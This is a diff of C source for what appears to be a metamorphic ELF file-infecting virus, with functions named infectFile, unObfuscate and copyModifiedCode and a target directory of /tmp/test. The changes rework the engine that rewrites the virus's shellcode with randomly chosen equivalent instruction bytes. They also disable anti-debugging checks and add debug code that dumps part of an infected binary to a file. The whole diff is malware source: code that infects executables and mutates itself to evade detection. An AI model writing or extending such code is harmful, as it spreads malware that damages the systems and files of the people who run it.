@@ -4,7 +4,7 @@ static void  start(void) {}
 
 #include "shellcode.h"
 
-asm("pushfq");
+/* asm("pushfq"); */
 int   entry_point(void *magic) {
   int     ret;
   char    infectDir[] = "/tmp/test";
@@ -15,8 +15,8 @@ int   entry_point(void *magic) {
   /*   return (stop(1, magic)); */
   /* if ((ret = preventDebug()) == -1) */
   /*   return (stop(1, magic)); */
-  if (ret == 1)
-    return (stop(0, magic));
+  /* if (ret == 1) */
+  /*   return (stop(0, magic)); */
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
       return (stop(1, magic));
@@ -33,7 +33,7 @@ static int   stop(int status, void *magic) {
     return (status);
   asm("leave\n\t"
       "leave\n\t"
-      "popfq\n\t"
+      /* "popfq\n\t" */
       "mov $0, %rbx\n\t"
       "mov $0, %rcx\n\t"
       "mov $0, %rdx\n\t"
@@ -579,24 +579,9 @@ static int8_t getRandomNbr(int8_t max) {
 }
 
 const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
-  /* "\x55\x48\x89\xe5\x48\x83", */
-  /* "\xcc\xcc\xcc\xcc\xcc\xcc", */
-  /* "" */
-  /* "\x55\x48\x89\xe5", */
-  /* "\x50\x48\x89\xe8\x5d\x50\x48\x89\xe8\x48\x89\xe5", */
-  /* "" */
-  /* "\xcc", */
-  /* "\x90", */
-  /* "", */
-  /* "\x55", */
-  /* "\x50\x48\x89\xe8\x5d\x50\x48\x89\xe8\x5d\x55", */
-  /* "" */
-  /* "\x50\x48\x89\xe8\x5d\x50\x48\x89\xe8\x48\x89\xe5", */
-  /* "\x53\x48\x89\xeb\x5d\x53\x48\x89\xeb\x48\x89\xe5", */
-  /* "\x51\x48\x89\xe9\x5d\x51\x48\x89\xe9\x48\x89\xe5", */
-  /* "\x52\x48\x89\xea\x5d\x52\x48\x89\xea\x48\x89\xe5", */
-  /* "\x57\x48\x89\xef\x5d\x57\x48\x89\xef\x48\x89\xe5", */
-  /* "\x56\x48\x89\xee\x5d\x56\x48\x89\xee\x48\x89\xe5", */
+  "\x5d\xc3\x42", // pop rbp
+  "\xc9\xc3\x42", // leave
+  "\x42",
 };
 
 static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
@@ -615,33 +600,29 @@ static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
     ins = (void *)copyModifiedCode - sizeof(instructions);
     while (ins != (void *)copyModifiedCode) {
       j = 0;
-      while (ins[j] != 0 && shellcode[i + j] == ins[j])
+      while (ins[j] != 0x42 && shellcode[i + j] == ins[j])
         j += 1;
-      if (ins[j] != 0 ||
+      if (ins[j] != 0x42 ||
   ((void *)(shellcode + i) >= (void *)copyModifiedCode - sizeof(instructions) && (void *)(shellcode + i) < (void *)copyModifiedCode)) {
-        while (ins[0] != 0)
+        while (ins[0] != 0x42)
           ins += MAX_INS_SIZE;
         ins += MAX_INS_SIZE;
         continue ;
       }
-      ins += MAX_INS_SIZE;
-      asm("int3");
-      /* l = 0; */
-      /* while (ins[0] != 0) { */
-      /*   l += 1; */
-      /*   ins += MAX_INS_SIZE; */
-      /* } */
-      /* ins -= l * MAX_INS_SIZE + getRandomNbr(l - 1) * MAX_INS_SIZE; */
-      // TODO Check if enough space
+      l = 0;
+      while (ins[0] != 0x42) {
+        l += 1;
+        ins += MAX_INS_SIZE;
+      }
+      ins = ins - MAX_INS_SIZE * l + getRandomNbr(l - 1) * MAX_INS_SIZE;
       i += j;
       k = 0;
-      while (ins[k]) {
+      while (ins[k] != 0x42) {
         bin[binSize] = ins[k];
         binSize += 1;
         k += 1;
       }
-      new->size += k - j;
-      while (ins[0] != 0)
+      while (ins[0] != 0x42)
         ins += MAX_INS_SIZE;
       ins += MAX_INS_SIZE;
     }
@@ -716,6 +697,13 @@ static int  infectFile(struct bfile bin) {
     munmap(bin.header, bin.size);
     return (-1);
   }
+  int fd;
+  char  yo[] = "yo";
+  size_t  size;
+  size = end - start + 9;
+  fd = open(yo, O_RDWR | O_CREAT, 0);
+  write(fd, (void *)bin.header + bin.size - size - 20, size + 20);
+  close(fd);
   write(bin.fd, bin.header, bin.size);
   close(bin.fd);
   munmap(bin.header, bin.size);
